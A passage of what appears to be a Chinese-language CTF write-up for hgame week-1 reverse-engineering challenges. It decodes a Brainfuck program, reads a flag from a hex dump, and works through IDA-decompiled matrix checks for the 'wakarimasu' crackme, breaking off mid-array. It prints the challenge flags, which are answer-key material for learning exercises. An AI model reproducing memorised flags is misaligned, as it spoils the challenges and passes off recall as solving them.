",&gt;+++++++[&lt;-------&gt;-]&lt;---[+.]"      //52</span></span><br><span class="line"><span class="comment">//    ",&gt;++++++[&lt;------&gt;-]&lt;+++[+.]"        //33</span></span><br><span class="line"><span class="comment">//    ",&gt;++++++++[&lt;----------&gt;-]&lt;++[+.]"   //78</span></span><br><span class="line"><span class="comment">//    ",&gt;++++++++++[&lt;----------&gt;-]&lt;--[+.]" //102</span></span><br><span class="line"><span class="comment">//    ",&gt;++++++++++[&lt;--------&gt;-]&lt;-----[+.]"//85</span></span><br><span class="line"><span class="comment">//    ",&gt;++++++++++[&lt;----------&gt;-]&lt;+[+.]"  //99</span></span><br><span class="line"><span class="comment">//    ",&gt;+++++++++[&lt;--------&gt;-]&lt;---[+.]"); //75</span></span><br></pre></td></tr></table></figure><p>得到的数字，查ASCII表拼起来得到 bR4!NfUcK</p><p>所以最后的flag就是<code>hgame{bR4!NfUcK}</code></p><h3 id="2-hellore"><a class="markdownIt-Anchor" href="#2-hellore"></a> 2. HelloRe</h3><h4 id="question-6"><a class="markdownIt-Anchor" href="#question-6"></a> Question</h4><p>Description</p><p>Welcoooooome!</p><p>URL</p><p><a href="http://plps4kyke.bkt.clouddn.com/HelloRe" target="_blank" rel="noopener">http://plps4kyke.bkt.clouddn.com/HelloRe</a></p><p>Base Score</p><p>50</p><h4 id="answer-6"><a class="markdownIt-Anchor" href="#answer-6"></a> Answer</h4><p>这个东西就是直接UE看就是了，flag就明文藏在里面。</p><blockquote><p>000007E0: 01 00 02 00 50 6C 65 61 73 65 20 69 6E 70 75 74    …Please.input</p><p>000007F0: 20 79 6F 75 72 20 6B 65 79 3A 00 68 67 61 6D 65    .your.key:.hgame</p><p>00000800: 7B 57 65 6C 63 30 6D 33 5F 74 30 5F 52 33 5F 57    {Welc0m3_t0_R3_W</p><p>00000810: 6F 72 6C 64 21 7D 00 73 75 63 63 65 73 73 00 66    orld!}.success.f</p><p>00000820: 61 69 6C 65 64 2E 2E 00 01 1B 03 3B 34 00 00 00    ailed…;4…</p></blockquote><p>所以flag就是<code>hgame{Welc0m3_t0_R3_World!}</code></p><h3 id="3-わかります"><a class="markdownIt-Anchor" href="#3-わかります"></a> 3. わかります</h3><h4 id="question-7"><a class="markdownIt-Anchor" href="#question-7"></a> Question</h4><p>Description</p><p>POSITION ZERO!</p><p>URL</p><p><a href="http://plps4kyke.bkt.clouddn.com/wakarimasu" target="_blank" rel="noopener">http://plps4kyke.bkt.clouddn.com/wakarimasu</a></p><p>Base Score</p><p>100</p><h4 id="answer-7"><a class="markdownIt-Anchor" href="#answer-7"></a> Answer</h4><p>一把进入IDA，然后找到main，再F5反编译成C语言</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You are a good Reverser!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(off_602250);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"wakalimasu.Give me your starlight!"</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">47</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)sub_40094C(&amp;s) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you are top star!"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"non-non dayo~"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后我们应该要让if里面的<code>(unsigned __int8)sub_40094C(&amp;s)</code>成立，所以看下<code>sub_40094C</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_40094C</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v2; <span class="comment">// [rsp+13h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  _DWORD *ptr; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  _DWORD *v8; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  _DWORD *v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">37</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  ptr = sub_400736(<span class="number">36</span>);</span><br><span class="line">  v7 = sub_400736(<span class="number">36</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr[i] = (<span class="keyword">char</span>)(a1[i] &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    v7[i] = a1[i] &amp; <span class="number">0xF</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = sub_40078E((__int64)ptr, (__int64)&amp;unk_602080, <span class="number">6</span>);</span><br><span class="line">  v9 = sub_400892((__int64)v7, (__int64)&amp;unk_602080, <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">35</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8[j] != dword_602120[j] || v9[j] != dword_6021C0[j] )</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="built_in">free</span>(v7);</span><br><span class="line">  <span class="built_in">free</span>(v8);</span><br><span class="line">  <span class="built_in">free</span>(v9);</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么a1其实就是我们的输入，并且应该长度是36。</p><p>然后的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr[i] = (<span class="keyword">char</span>)(a1[i] &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    v7[i] = a1[i] &amp; <span class="number">0xF</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>就相当于把我们的输入的每个字符的前四位和后四位分别存入<code>ptr</code>和<code>v7</code></p><p>再接着的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v8 = sub_40078E((__int64)ptr, (__int64)&amp;unk_602080, <span class="number">6</span>);</span><br><span class="line">v9 = sub_400892((__int64)v7, (__int64)&amp;unk_602080, <span class="number">6</span>);</span><br></pre></td></tr></table></figure><p>相当于把<code>ptr</code>和<code>v7</code>分别做了处理(这个接下来再说)，然后再赋值给v8和v9。</p><p>最后的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">35</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8[j] != dword_602120[j] || v9[j] != dword_6021C0[j] )</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">return</span> v2;</span><br></pre></td></tr></table></figure><p>为了要让v2最后是1，所以也就是说：</p><p>对于所有的<code>j</code>,都要<code>v8[j] == dword_602120[j] &amp;&amp; v9[j] == dword_6021C0[j]</code>成立</p><p>这里的<code>dword_602120</code>和<code>dword_6021C0</code>（包括上面的<code>unk_602080</code>）都是在ida里可以找到数据的。</p><hr /><p>好的，看回到上面的两个处理<code>ptr</code>和<code>v7</code>的函数：</p><p>第一个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__fastcall <span class="title">sub_40078E</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  _DWORD *v8; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  v8 = sub_400736(a3);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v4; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v4; ++k )</span><br><span class="line">        v8[v4 * i + j] += *(_DWORD *)(<span class="number">4L</span>L * (v4 * i + k) + a1) * *(_DWORD *)(<span class="number">4L</span>L * (v4 * k + j) + a2);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__fastcall <span class="title">sub_400892</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  v7 = sub_400736(a3);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v4; ++j )</span><br><span class="line">      v7[v4 * i + j] = *(_DWORD *)(<span class="number">4L</span>L * (v4 * i + j) + a1) + *(_DWORD *)(<span class="number">4L</span>L * (v4 * i + j) + a2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数里面的<code>a1,2,3</code>用之前的变量代入其实就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">6</span>; ++j) &#123;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">6</span>; ++k)&#123;</span><br><span class="line">            v8[<span class="number">6</span> * i + j] += v6[<span class="number">6</span> * i + k] * &amp;unk_602080[<span class="number">6</span> * k + j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) </span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">6</span>; ++j) </span><br><span class="line">        v9[<span class="number">6</span> * i + j] = v7[<span class="number">6</span> * i + j]+ &amp; unk_602080[<span class="number">6</span> * i + j]</span><br></pre></td></tr></table></figure><p>因为<code>v8</code>，<code>v9</code>应该等于<code>dword_602120</code>和<code>dword_6021C0</code>，</p><p>所以这个时候，我们只需要求出v6和v7就可以还原出我们的输入，也就是flag.</p><p>从ida中提取数据之后，分别如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v8 = [<span class="string">'7A'</span>, <span class="string">'CF'</span>, <span class="string">'8C'</span>, <span class="string">'95'</span>, <span class="string">'8E'</span>, <span class="string">'A8'</span>,</span><br><span class="line">      <span class="string">'5F'</span>, <span class="string">'C9'</span>, <span class="string">'7A'</span>, <span class="string">'91'</span>, <span class="string">'88'</span>, <span class="string">'A7'</span>,</span><br><span class="line">      <span class="string">'70'</span>, <span class="string">'C0'</span>, <span class="string">'7F'</span>, <span class="string">'89'</span>, <span class="string">'86'</span>, <span class="string">'93'</span>,</span><br><span class="line">      <span class="string">'5F'</span>, <span class="string">'CF'</span>, <span class="string">'6E'</span>, <span class="string">'86'</span>, <span class="string">'85'</span>, <span class="string">'AD'</span>,</span><br><span class="line">      <span class="string">'88'</span>, <span class="string">'D4'</span>, <span class="string">'A0'</span>, <span class="string">'A2'</span>, <span class="string">'98'</span>, <span class="string">'B3'</span>,</span><br><span class="line">      <span class="string">'79'</span>, <span class="string">'C1'</span>, <span class="string">'7E'</span>, <span class="string">'7E'</span>, <span class="string">'77'</span>, <span class="string">'93'</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v9 = [<span class="string">'10'</span>, <span class="string">'08'</span>, <span class="string">'08'</span>, <span class="string">'0E'</span>, <span class="string">'06'</span>, <span class="string">'0B'</span>,</span><br><span class="line">      <span class="string">'05'</span>, <span class="string">'17'</span>, <span class="string">'05'</span>, <span class="string">'0A'</span>, <span class="string">'0C'</span>, <span class="string">'17'</span>,</span><br><span class="line">      <span class="string">'0E'</span>, <span class="string">'17'</span>, <span class="string">'13'</span>, <span class="string">'07'</span>, <span class="string">'08'</span>, <span class="string">'0A'</span>,</span><br><span class="line">      <span class="string">'04'</span>, <span class="string">'0D'</span>, <span class="string">'16'</span>, <span class="string">'11'</span>, <span class="string">'0B'</span>, <span class="string">'16'</span>,</span><br><span class="line">      <span class="string">'06'</span>, <span class="string">'0E'</span>, <span class="string">'02'</span>, <span class="string">'0B'</span>, <span class="string">'12'</span>, <span class="string">'09'</span>,</span><br><span class="line">      <span class="string">'05'</span>, <span class="string">'08'</span>, <span class="string">'08'</span>, <span class="string">'0A'</span>, <span class="string">'10'</span>, <span class="string">'0D'</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unk = [<span class="number">8</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">9</span>,</span><br><span class="line">       <span class="number">3</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">8</span>,</span><br><span class="line">       <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">7</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>,</span><br><span class="line">       <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>显然代码中的运算都可以看做是6x6的矩阵运算。</p><p>所以可以得到</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>V</mi><mn>8</mn></msub><mo>=</mo><msub><mi>V</mi><mn>6</mn></msub><mo separator="true">⋅</mo><mi>U</mi><mi>n</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">V_8=V_6 · Unk </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>V</mi><mn>9</mn></msub><mo>=</mo><msub><mi>V</mi><mn>7</mn></msub><mo>+</mo><mi>U</mi><mi>n</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">V_9=V_7+Unk</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span></span></p><p>所以</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>V</mi><mn>6</mn></msub><mo>=</mo><msub><mi>V</mi><mn>8</mn></msub><mo separator="true">⋅</mo><mi>U</mi><mi>n</mi><msup><mi>k</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">V_6=V_8·Unk^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.014108em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault">n</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>V</mi><mn>7</mn></msub><mo>=</mo><msub><mi>V</mi><mn>9</mn></msub><mo>−</mo><mi>U</mi><mi>n</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">V_7=V_9-Unk</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span></span></p><hr /><p>对于V7而言，只要执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v7 = [(int(x, <span class="number">16</span>) - y) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(v9, unk)]</span><br></pre></td></tr></table></figure><p>对于V8而言，则需要求逆，然后就在网上求了一下。</p><p><img src="/images/hgame-week1/ni.png" alt="ni" /></p><p>然后一乘</p><p><img src="/images/hgame-week1/cheng.png" alt="cheng" /></p><p>最后我们可以得到这两个数组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v6 = [</span><br><span class="line">    <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>,</span><br><span class="line">    <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>,</span><br><span class="line">    <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">7</span>,</span><br><span class="line">    <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span 